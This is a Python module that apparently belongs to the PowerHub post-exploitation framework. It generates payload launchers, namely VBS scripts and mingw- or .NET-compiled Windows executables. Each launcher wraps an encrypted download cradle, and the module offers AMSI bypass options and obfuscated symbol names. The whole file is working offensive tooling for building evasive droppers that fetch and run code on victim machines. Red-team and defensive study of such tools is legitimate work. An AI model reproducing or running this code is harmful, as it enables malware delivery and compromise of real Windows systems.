import subprocess
import tempfile
import os

import jinja2

from powerhub.tools import encrypt, generate_random_key
from powerhub.stager import build_cradle
from powerhub.logging import log
from powerhub.obfuscation import symbol_name


def load_template(filename, **kwargs):
    """Wrapper for loading a jinja2 template from file"""
    templateLoader = jinja2.FileSystemLoader(
        searchpath="./powerhub/templates/payloads/"
    )
    templateEnv = jinja2.Environment(loader=templateLoader)
    TEMPLATE_FILE = filename
    template = templateEnv.get_template(TEMPLATE_FILE)
    outputText = template.render(**kwargs)
    return outputText


def create_filename(args):
    result = 'powerhub'
    result += '-' + args['Launcher']
    result += '-' + args['Amsi']
    result += '-' + args['Transport']
    if args['ClipExec'] != 'none':
        result += '-' + args['ClipExec']
    if args['Launcher'] in [
        'mingw32',
        'dotnetexe',
    ]:
        if args['32bit'] == 'true':
            result += '-' + '32bit'
        else:
            result += '-' + '64bit'
        result += '.exe'
    elif args['Launcher'] == 'vbs':
        result += ".vbs"
    return result


def create_payload(args):
    payload_generators = {
        "mingw32": create_exe,
        "dotnetexe": create_dotnet,
        "vbs": create_vbs,
        #  "wordmacro": create_docx,
        #  "rundll32": create_exe,
        #  "installutil": create_exe,
    }
    return payload_generators[args['Launcher']](args)


def create_vbs(args):
    filename = create_filename(args)
    args = dict(args)  # convert from immutable dict
    args['Launcher'] = 'cmd_enc'
    cmd = build_cradle(args).replace('\n', '')
    cmd = ('CreateObject("WScript.Shell").' +
           'exec("%s")') % cmd
    key = generate_random_key(16)
    cmd = encrypt(cmd.encode(), key)
    vbs_code = load_template(
        'powerhub.vbs',
        HEX_CODE=' '.join('%02X' % c for c in cmd),
        HEX_KEY=' '.join('%02X' % ord(c) for c in key),
        symbol_name=symbol_name,
    )
    return filename, vbs_code


def create_docx(args):
    _, vbs_code = create_vbs(args)
    # randomize creator in docProps/core.xml


def compile_source(args, source_file, compile_cmd, formatter):
    filename = create_filename(args)
    args = dict(args)  # convert from immutable dict
    args['Launcher'] = 'cmd_enc'
    cmd = build_cradle(args)
    size = len(cmd)
    key = generate_random_key(16)
    cmd = encrypt(cmd.encode(), key)
    c_code = load_template(
        source_file,
        CMD=formatter(cmd),
        LEN_CMD=size,
        KEY=key,
    )

    with tempfile.TemporaryDirectory() as tmpdirname:
        outfile = os.path.join(tmpdirname, 'powerhub.out')
        infile = os.path.join(tmpdirname, 'powerhub.in')
        with open(infile, 'w') as f:
            f.write(c_code)
        pipe = subprocess.Popen(
            compile_cmd(outfile) + [infile],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
        )
        out = pipe.communicate()
        if pipe.returncode == 0:
            with open(outfile, 'rb') as f:
                result = f.read()
        else:
            raise RuntimeError('Compiling the payload failed, '
                               'see console output')
            log.error('Compiling the payload failed: ' + out)

    return filename, result


def create_exe(args):
    if args['32bit'] == 'true':
        mingw = 'i686-w64-mingw32-gcc'
    else:
        mingw = 'x86_64-w64-mingw32-gcc'

    return compile_source(
        args,
        'powerhub.c',
        lambda outfile: [mingw, "-Wall", "-x", "c", "-o", outfile],
        lambda cmd: ''.join('\\x%02x' % c for c in cmd),
    )


def create_dotnet(args):
    if args['32bit'] == 'true':
        platform = "x86"
    else:
        platform = "x64"

    return compile_source(
        args,
        'powerhub.cs',
        lambda outfile: ["mcs", "-warnaserror",
                         "-platform:" + platform, "-out:" + outfile],
        lambda cmd: ','.join('0x%02x' % c for c in cmd),
    )
